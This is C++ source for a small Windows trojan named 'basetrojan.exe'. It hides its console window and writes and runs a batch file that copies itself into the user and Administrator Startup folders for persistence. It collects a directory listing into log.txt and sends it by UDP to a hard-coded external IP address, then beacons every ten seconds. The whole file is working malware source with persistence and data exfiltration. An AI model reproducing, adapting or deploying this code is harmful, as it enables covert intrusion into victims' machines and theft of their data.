#include <WinSock2.h>
#include <Windows.h>
#include<direct.h>
#include<stdio.h>
#include<fstream>
#include<iostream>
#include<io.h>
#include<sstream>
DWORD WINAPI MyThreadProc1(LPVOID lpParameter);
using namespace std;
#pragma comment(lib,"ws2_32.lib")
#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#define BUFFER_SIZE 4096
char bat[]="@echo off \ncopy /y \"%~dp0basetrojan.exe\"  C:\\\"Documents and Settings\"\\Administrator\\\"「开始」菜单\"\\程序\\启动\ncopy /y \"%~dp0basetrojan.exe\"  C:\\Users\\alpha\\AppData\\Roaming\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup \nstart basetrojan.exe";
char send_buff[512] = "example";
void setblank(){
	for(int i=0;i<510;i++){
		send_buff[i]='-';
	}
	send_buff[510]='\0';
	send_buff[511]='\0';
}
void udpsend(){
	WSADATA wsa_data;
		int ret = WSAStartup(MAKEWORD(2, 2), &wsa_data);
		SOCKET fd_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		SOCKADDR_IN server_addr; //服务器配置
		int port = 15002; //端口号 
		server_addr.sin_family = AF_INET;
		server_addr.sin_port = htons(port);//端口号范围： 0 ~65535
		server_addr.sin_addr.s_addr = inet_addr("49.233.89.112");
		
		ret = sendto(fd_socket, send_buff, strlen(send_buff), 0, (SOCKADDR *)&server_addr, 512);
		closesocket(fd_socket);
		WSACleanup();
		//
}

void CreateStartbat(){
	fstream fp("b.bat",ios::out);
		//fputs(bat,fp);
		fp<<bat;
		fp.close();
		//system(bat);
		//Sleep(10*1000);
		int a=access("C:\\Users\\alpha\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\basetrojan.exe",0);
		a+=access("C:\\Documents and Settings\\Administrator\\「开始」菜单\\程序\\启动\\basetrojan.exe",0);
		if(a<-1){
			system("b.bat");
		}
		//exit(1);
}
int listen(){
	WSADATA ws;
	WSAStartup(MAKEWORD(2, 2), &ws);
	int port=15003;
	int client = socket(AF_INET, SOCK_DGRAM, 0);
	SOCKET serSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP); 
    if(serSocket == INVALID_SOCKET)
    {
        printf("socket error !");
        return 0;
    }
	char szHostName[MAX_PATH] = {0};
    int nRetCode;
    nRetCode = gethostname(szHostName, sizeof(szHostName));
	char* lpLocalIP;
	PHOSTENT hostinfo;
	hostinfo = gethostbyname(szHostName);
	lpLocalIP = inet_ntoa(*(struct in_addr*)*hostinfo->h_addr_list);
	sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_addr.S_un.S_addr = inet_addr(lpLocalIP);
	addr.sin_port = htons(port);
	addr.sin_addr.S_un.S_addr = INADDR_ANY;
    if(bind(serSocket, (sockaddr *)&addr, sizeof(addr)) == SOCKET_ERROR)
    {
        printf("bind error !");
        closesocket(serSocket);
        return 0;
    }
	 sockaddr_in remoteAddr;
    int nAddrLen = sizeof(remoteAddr); 
	while(1){
        char recvData[512];  
        int ret = recvfrom(serSocket, recvData, 512, 0, (sockaddr *)&remoteAddr, &nAddrLen);
        
            fstream fl("log.txt",ios::app);
			//fputs(bat,fp);
			fl<<"a udp server sending : "<<recvData<<endl;
			cout<<"a udp server sending : "<<recvData<<endl;
			fl.close();          
        
	}
    closesocket(serSocket); 
    WSACleanup();
}
void base64_encode(char *str)  
{  
    long len;  
    long str_len;  
    unsigned char *res;  
    int i,j;  
//定义base64编码表  
    unsigned char *base64_table=(unsigned char*)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";  
  
//计算经过base64编码后的字符串长度  
    str_len=strlen((const char *)str);  
    if(str_len % 3 == 0)  
        len=str_len/3*4;  
    else  
        len=(str_len/3+1)*4;  
  
    res=(unsigned char *)malloc(sizeof(unsigned char)*len+1);  
    res[len]='\0';  
  
//以3个8位字符为一组进行编码  
    for(i=0,j=0;i<len-2;j+=3,i+=4)  
    {  
        res[i]=base64_table[str[j]>>2]; //取出第一个字符的前6位并找出对应的结果字符  
        res[i+1]=base64_table[(str[j]&0x3)<<4 | (str[j+1]>>4)]; //将第一个字符的后位与第二个字符的前4位进行组合并找到对应的结果字符  
        res[i+2]=base64_table[(str[j+1]&0xf)<<2 | (str[j+2]>>6)]; //将第二个字符的后4位与第三个字符的前2位组合并找出对应的结果字符  
        res[i+3]=base64_table[str[j+2]&0x3f]; //取出第三个字符的后6位并找出结果字符  
    }  
  
    switch(str_len % 3)  
    {  
        case 1:  
            res[i-2]='=';  
            res[i-1]='=';  
            break;  
        case 2:  
            res[i-1]='=';  
            break;  
    }  
	for(int i=0;i<=len;i++){
		send_buff[i]=res[i];
	}  
}  
  
void fetchdata(){
	system("dir>>log.txt");
	fstream inf;
	char* text;
	FILE *pf = fopen("log.txt","r");
	fseek(pf,0,SEEK_END);
	long lSize = ftell(pf);
	// 用完后需要将内存free掉
	text=(char*)malloc(lSize+1);
	rewind(pf); 
	fread(text,sizeof(char),lSize,pf);
	strcpy(send_buff,text);
	udpsend();
}
int main(int argc,char* argv[]) {
	setblank();
	//system("b.bat");
	ShowWindow(FindWindow((LPCWSTR)"ConsoleWindowClass",(LPCWSTR)argv[0]), 0);
	char buf1[256];
	_getcwd(buf1, sizeof(buf1));
	//printf("%s\n",buf1);
	if(strcmp(buf1,"C:\\Users\\alpha\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")!=0&&strcmp(buf1,"C:\\Documents and Settings\\Administrator\\「开始」菜单\\程序\\启动")!=0){
		CreateStartbat();
	}
	HANDLE h;
	h= CreateThread(NULL,0,MyThreadProc1,NULL,0,NULL);
	fetchdata();
	while (1) {
		
		//udpsend();
		//listen();
		
		udpsend();
		Sleep(1000*10);
	}
}
DWORD WINAPI MyThreadProc1(LPVOID lpParameter)
{	
	setblank();
	Sleep(1000*10);
	
    return 0;
}
